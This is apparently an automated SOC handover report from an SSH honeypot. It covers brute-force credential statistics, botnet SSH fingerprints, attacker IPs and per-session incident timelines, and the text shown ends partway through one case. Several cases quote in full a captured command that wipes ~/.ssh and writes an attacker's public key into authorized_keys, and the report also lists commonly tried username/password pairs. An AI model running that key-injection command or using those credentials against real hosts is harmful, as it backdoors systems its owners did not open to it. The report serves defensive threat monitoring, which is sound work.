# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-29 |
| **Generated At** | 2026-10-29T03:24:08Z |
| **Shift Time** | 03:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **144** |
| Confirmed Threats | **129** |
| False Positives Filtered | **15** (10.4%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **23** |
| High Severity Cases | **94** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **514** |
| Unique Credential Pairs | **378** |
| Unique Usernames | **178** |
| Unique Passwords | **326** |
| Successful Auth Pairs | **441** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 130 |
| `ubuntu` | 64 |
| `345gs5662d34` | 57 |
| `support` | 14 |
| `bitrix` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 57 |
| `3245gs5662d34` | 56 |
| `123456` | 19 |
| `support` | 14 |
| `12345678` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 57 |
| `root` | `3245gs5662d34` | 40 |
| `support` | `support` | 14 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | 4 |
| `root` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `predator` | `predator` | `10.0.0.73` | 2026-10-29T00:00:14 |
| `root` | `Wsx123Wsx` | `156.232.13.246` | 2026-10-29T00:00:48 |
| `345gs5662d34` | `345gs5662d34` | `156.232.13.246` | 2026-10-29T00:00:50 |
| `root` | `3245gs5662d34` | `156.232.13.246` | 2026-10-29T00:00:50 |
| `user` | `111111` | `10.0.0.73` | 2026-10-29T00:01:12 |
| `root` | `Pass_Word` | `103.163.118.115` | 2026-10-29T00:02:05 |
| `345gs5662d34` | `345gs5662d34` | `103.163.118.115` | 2026-10-29T00:02:09 |
| `root` | `3245gs5662d34` | `103.163.118.115` | 2026-10-29T00:02:11 |
| `ubuntu` | `111111` | `10.0.0.73` | 2026-10-29T00:02:11 |
| `root` | `111111` | `10.0.0.73` | 2026-10-29T00:03:13 |
| `root` | `P@$$word123123` | `133.88.99.250` | 2026-10-29T00:03:19 |
| `345gs5662d34` | `345gs5662d34` | `133.88.99.250` | 2026-10-29T00:03:23 |
| `root` | `3245gs5662d34` | `133.88.99.250` | 2026-10-29T00:03:24 |
| `root` | `Aa.123456` | `10.0.0.73` | 2026-10-29T00:04:17 |
| `pavel` | `Password123` | `10.0.0.73` | 2026-10-29T00:05:00 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-29T00:05:04 |
| `pavel` | `3245gs5662d34` | `10.0.0.73` | 2026-10-29T00:05:06 |
| `ubuntu` | `ucloud.cn` | `10.0.0.73` | 2026-10-29T00:05:20 |
| `bitget` | `bitget` | `10.0.0.73` | 2026-10-29T00:06:22 |
| `support` | `support` | `176.53.159.196` | 2026-10-29T00:06:33 |
_… 421 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **144** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 66 |
| Go SSH scanner | 25 |
| OpenSSH | 2 |
| Unknown | 1 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 59 | 29 |
| `2ec37a7cc8da...` | Mirai/variant | 14 | 1 |
| `16443846184e...` | Generic scanner | 6 | 5 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 59 | 29 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 14 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 5 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `3cb24313ef79...` | libssh | 2 | 1 | Mirai/variant |
| `a984ff804585...` | Unknown | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **21** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 27 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `180.93.193.100`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.20.165.213`, `140.233.190.80`, `115.178.75.243`, `99.92.204.98`, `189.203.163.10`, `187.174.238.116`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **40** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 20 | HIGH |
| `AS396982` | Google LLC | 5 | LOW |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS140293` | CHINATELECOM Jiangsu province Changzhou 5G network | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (94)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ad8a2e70bdbe

| Field | Detail |
|---|---|
| **Source IP** | `156.232.13[.]246` |
| **First Seen** | 2026-10-29 00:00 |
| **Last Seen** | 2026-10-29 00:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:00:47` | `cowrie.session.connect` |
| `2026-10-29 00:00:47` | `cowrie.client.version` |
| `2026-10-29 00:00:48` | `cowrie.client.kex` |
| `2026-10-29 00:00:48` | `cowrie.login.success` |
| `2026-10-29 00:00:49` | `cowrie.session.params` |
| `2026-10-29 00:00:49` | `cowrie.command.input` |
| `2026-10-29 00:00:49` | `cowrie.command.failed` |
| `2026-10-29 00:00:49` | `cowrie.log.closed` |
| `2026-10-29 00:00:49` | `cowrie.session.params` |
| `2026-10-29 00:00:49` | `cowrie.command.input` |
| `2026-10-29 00:00:50` | `cowrie.session.file_download` |
| `2026-10-29 00:00:50` | `cowrie.log.closed` |
| `2026-10-29 00:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.232.13[.]246` to AbuseIPDB if not already reported
- [ ] Block `156.232.13[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86cbcc9685af

| Field | Detail |
|---|---|
| **Source IP** | `156.232.13[.]246` |
| **First Seen** | 2026-10-29 00:00 |
| **Last Seen** | 2026-10-29 00:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:00:50` | `cowrie.session.connect` |
| `2026-10-29 00:00:50` | `cowrie.client.version` |
| `2026-10-29 00:00:50` | `cowrie.client.kex` |
| `2026-10-29 00:00:50` | `cowrie.login.success` |
| `2026-10-29 00:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.232.13[.]246` to AbuseIPDB if not already reported
- [ ] Block `156.232.13[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeac121f6725

| Field | Detail |
|---|---|
| **Source IP** | `103.163.118[.]115` |
| **First Seen** | 2026-10-29 00:02 |
| **Last Seen** | 2026-10-29 00:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:02:04` | `cowrie.session.connect` |
| `2026-10-29 00:02:04` | `cowrie.client.version` |
| `2026-10-29 00:02:04` | `cowrie.client.kex` |
| `2026-10-29 00:02:05` | `cowrie.login.success` |
| `2026-10-29 00:02:06` | `cowrie.session.params` |
| `2026-10-29 00:02:06` | `cowrie.command.input` |
| `2026-10-29 00:02:06` | `cowrie.command.failed` |
| `2026-10-29 00:02:07` | `cowrie.log.closed` |
| `2026-10-29 00:02:07` | `cowrie.session.params` |
| `2026-10-29 00:02:07` | `cowrie.command.input` |
| `2026-10-29 00:02:08` | `cowrie.session.file_download` |
| `2026-10-29 00:02:08` | `cowrie.log.closed` |
| `2026-10-29 00:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.118[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.163.118[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c27c220e5b

| Field | Detail |
|---|---|
| **Source IP** | `103.163.118[.]115` |
| **First Seen** | 2026-10-29 00:02 |
| **Last Seen** | 2026-10-29 00:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:02:08` | `cowrie.session.connect` |
| `2026-10-29 00:02:08` | `cowrie.client.version` |
| `2026-10-29 00:02:08` | `cowrie.client.kex` |
| `2026-10-29 00:02:09` | `cowrie.login.success` |
| `2026-10-29 00:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.118[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.163.118[.]115` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c12b52f8d10a

| Field | Detail |
|---|---|
| **Source IP** | `133.88.99[.]250` |
| **First Seen** | 2026-10-29 00:03 |
| **Last Seen** | 2026-10-29 00:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:03:18` | `cowrie.session.connect` |
| `2026-10-29 00:03:18` | `cowrie.client.version` |
| `2026-10-29 00:03:19` | `cowrie.client.kex` |
| `2026-10-29 00:03:19` | `cowrie.login.success` |
| `2026-10-29 00:03:20` | `cowrie.session.params` |
| `2026-10-29 00:03:20` | `cowrie.command.input` |
| `2026-10-29 00:03:20` | `cowrie.command.failed` |
| `2026-10-29 00:03:20` | `cowrie.log.closed` |
| `2026-10-29 00:03:21` | `cowrie.session.params` |
| `2026-10-29 00:03:21` | `cowrie.command.input` |
| `2026-10-29 00:03:21` | `cowrie.session.file_download` |
| `2026-10-29 00:03:21` | `cowrie.log.closed` |
| `2026-10-29 00:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `133.88.99[.]250` to AbuseIPDB if not already reported
- [ ] Block `133.88.99[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-697e5ce9ebe9

| Field | Detail |
|---|---|
| **Source IP** | `133.88.99[.]250` |
| **First Seen** | 2026-10-29 00:03 |
| **Last Seen** | 2026-10-29 00:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:03:22` | `cowrie.session.connect` |
| `2026-10-29 00:03:22` | `cowrie.client.version` |
| `2026-10-29 00:03:22` | `cowrie.client.kex` |
| `2026-10-29 00:03:23` | `cowrie.login.success` |
| `2026-10-29 00:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `133.88.99[.]250` to AbuseIPDB if not already reported
- [ ] Block `133.88.99[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4712ae9fe519

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-29 00:06 |
| **Last Seen** | 2026-10-29 00:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:06:33` | `cowrie.session.connect` |
| `2026-10-29 00:06:33` | `cowrie.client.version` |
| `2026-10-29 00:06:33` | `cowrie.client.kex` |
| `2026-10-29 00:06:33` | `cowrie.login.success` |
| `2026-10-29 00:06:33` | `cowrie.direct-tcpip.request` |
| `2026-10-29 00:06:33` | `cowrie.direct-tcpip.data` |
| `2026-10-29 00:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff68e53b5f16

| Field | Detail |
|---|---|
| **Source IP** | `104.131.242[.]212` |
| **First Seen** | 2026-10-29 00:12 |
| **Last Seen** | 2026-10-29 00:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:12:02` | `cowrie.session.connect` |
| `2026-10-29 00:12:02` | `cowrie.client.version` |
| `2026-10-29 00:12:02` | `cowrie.client.kex` |
| `2026-10-29 00:12:03` | `cowrie.login.success` |
| `2026-10-29 00:12:03` | `cowrie.session.params` |
| `2026-10-29 00:12:03` | `cowrie.command.input` |
| `2026-10-29 00:12:03` | `cowrie.log.closed` |
| `2026-10-29 00:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.131.242[.]212` to AbuseIPDB if not already reported
- [ ] Block `104.131.242[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb1c1edbdd69

| Field | Detail |
|---|---|
| **Source IP** | `162.243.51[.]139` |
| **First Seen** | 2026-10-29 00:17 |
| **Last Seen** | 2026-10-29 00:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:17:45` | `cowrie.session.connect` |
| `2026-10-29 00:17:45` | `cowrie.client.version` |
| `2026-10-29 00:17:45` | `cowrie.client.kex` |
| `2026-10-29 00:17:45` | `cowrie.login.success` |
| `2026-10-29 00:17:46` | `cowrie.session.params` |
| `2026-10-29 00:17:46` | `cowrie.command.input` |
| `2026-10-29 00:17:46` | `cowrie.log.closed` |
| `2026-10-29 00:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.51[.]139` to AbuseIPDB if not already reported
- [ ] Block `162.243.51[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889d84d23738

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-10-29 00:23 |
| **Last Seen** | 2026-10-29 00:23 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:23:02` | `cowrie.session.connect` |
| `2026-10-29 00:23:02` | `cowrie.client.version` |
| `2026-10-29 00:23:02` | `cowrie.client.kex` |
| `2026-10-29 00:23:03` | `cowrie.login.success` |
| `2026-10-29 00:23:09` | `cowrie.direct-tcpip.request` |
| `2026-10-29 00:23:11` | `cowrie.direct-tcpip.ja4` |
| `2026-10-29 00:23:11` | `cowrie.direct-tcpip.data` |
| `2026-10-29 00:23:11` | `cowrie.direct-tcpip.request` |
| `2026-10-29 00:23:12` | `cowrie.direct-tcpip.ja4` |
| `2026-10-29 00:23:12` | `cowrie.direct-tcpip.data` |
| `2026-10-29 00:23:15` | `cowrie.direct-tcpip.request` |
| `2026-10-29 00:23:15` | `cowrie.direct-tcpip.ja4` |
| `2026-10-29 00:23:15` | `cowrie.direct-tcpip.data` |
| `2026-10-29 00:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae26ae385a4

| Field | Detail |
|---|---|
| **Source IP** | `162.243.200[.]146` |
| **First Seen** | 2026-10-29 00:27 |
| **Last Seen** | 2026-10-29 00:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:27:34` | `cowrie.session.connect` |
| `2026-10-29 00:27:34` | `cowrie.client.version` |
| `2026-10-29 00:27:34` | `cowrie.client.kex` |
| `2026-10-29 00:27:34` | `cowrie.login.success` |
| `2026-10-29 00:27:35` | `cowrie.session.params` |
| `2026-10-29 00:27:35` | `cowrie.command.input` |
| `2026-10-29 00:27:35` | `cowrie.log.closed` |
| `2026-10-29 00:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `162.243.200[.]146` to AbuseIPDB if not already reported
- [ ] Block `162.243.200[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db4a0f189be1

| Field | Detail |
|---|---|
| **Source IP** | `220.127.148[.]6` |
| **First Seen** | 2026-10-29 00:33 |
| **Last Seen** | 2026-10-29 00:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:33:45` | `cowrie.session.connect` |
| `2026-10-29 00:33:45` | `cowrie.client.version` |
| `2026-10-29 00:33:45` | `cowrie.client.kex` |
| `2026-10-29 00:33:46` | `cowrie.login.success` |
| `2026-10-29 00:33:47` | `cowrie.session.params` |
| `2026-10-29 00:33:47` | `cowrie.command.input` |
| `2026-10-29 00:33:47` | `cowrie.command.failed` |
| `2026-10-29 00:33:47` | `cowrie.log.closed` |
| `2026-10-29 00:33:48` | `cowrie.session.params` |
| `2026-10-29 00:33:48` | `cowrie.command.input` |
| `2026-10-29 00:33:48` | `cowrie.session.file_download` |
| `2026-10-29 00:33:48` | `cowrie.log.closed` |
| `2026-10-29 00:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.127.148[.]6` to AbuseIPDB if not already reported
- [ ] Block `220.127.148[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b2894f4dd7

| Field | Detail |
|---|---|
| **Source IP** | `220.127.148[.]6` |
| **First Seen** | 2026-10-29 00:33 |
| **Last Seen** | 2026-10-29 00:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:33:48` | `cowrie.session.connect` |
| `2026-10-29 00:33:48` | `cowrie.client.version` |
| `2026-10-29 00:33:49` | `cowrie.client.kex` |
| `2026-10-29 00:33:49` | `cowrie.login.success` |
| `2026-10-29 00:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.127.148[.]6` to AbuseIPDB if not already reported
- [ ] Block `220.127.148[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b643ee81b24

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-10-29 00:36 |
| **Last Seen** | 2026-10-29 00:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:36:17` | `cowrie.session.connect` |
| `2026-10-29 00:36:17` | `cowrie.client.version` |
| `2026-10-29 00:36:17` | `cowrie.client.kex` |
| `2026-10-29 00:36:17` | `cowrie.login.success` |
| `2026-10-29 00:36:18` | `cowrie.session.params` |
| `2026-10-29 00:36:18` | `cowrie.command.input` |
